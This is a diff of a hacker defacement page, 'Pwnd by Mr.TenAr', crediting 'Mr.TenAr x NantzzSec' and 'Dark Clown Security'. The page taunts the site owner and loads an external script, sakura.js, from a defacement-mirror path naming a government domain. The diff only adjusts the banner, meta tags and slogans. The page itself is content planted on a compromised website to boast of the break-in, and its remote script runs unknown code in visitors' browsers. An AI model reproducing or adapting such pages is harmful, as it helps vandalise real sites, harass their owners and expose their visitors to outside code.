@@ -1,19 +1,12 @@
-<html>
-<head>
-  <title>Pwnd by Mr.TenAr</title>
-  <link rel="icon" type="image/png" href="https://c.top4top.io/p_20661mc0d0.png">
-  <meta property="og:image" content="https://c.top4top.io/p_20661mc0d0.pngg" />
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="Hacked By Mr.TenAr x NantzzSec">
-  <meta name="keywords" content="Hacked By Mr.TenAr x NantzzSec">
-  <meta name="author" content="Hacked By Mr.TenAr x NantzzSec">
-  <meta name="robots" content="index, follow">
 
-  <!-- Open Graph Tags -->
-  <meta property="og:title" content="Pwnd by Mr.TenAr">
-  <meta property="og:description" content="Hacked By Mr.TenAr">
-  <meta property="og:image" content="https://c.top4top.io/p_20661mc0d0.png">
-  <meta property="og:type" content="website">
+<html>
+
+<head>
+	<title>Pwnd by Mr.TenAr</title>
+	<link rel="icon" type="image/png" href="https://c.top4top.io/p_20661mc0d0.png">
+	<meta property="og:image" content="https://c.top4top.io/p_20661mc0d0.pngg" />
+	<meta name="description" content="<3">
+	<meta charset="utf-8">
 	<style>
 		html,
 		body {
@@ -65,8 +58,9 @@
 							<img src="https://c.top4top.io/p_20661mc0d0.png" width="450px" heigt="450px">
 							<br> <br>
 							<font size="5" style="color: white;">
-								<b><i><code>&hearts; Pwn3dz By Mr.TenAr x NantzzSec &hearts; </font>
+								<b><i><code>&hearts; Pwn3dz By Mr.TenAr x NantzzSec&hearts; </font>
 		 	 				 <br><br><h2 style="color: white;">~ I'm back to test how big your security force is, you can't stop me. ~<h2><br>
+                                <h2 style="color: white;">~ We Are Dark Clown Security ~<h2><br>
 			<script type="text/javascript" src="http://zonehmirrors.org/defaced/2020/06/23/ardma.midanuttalim.com/suhunan.sukabumikab.go.id/sakura.js"></script>
 		 	 				</body>
 		 	 				 </html>
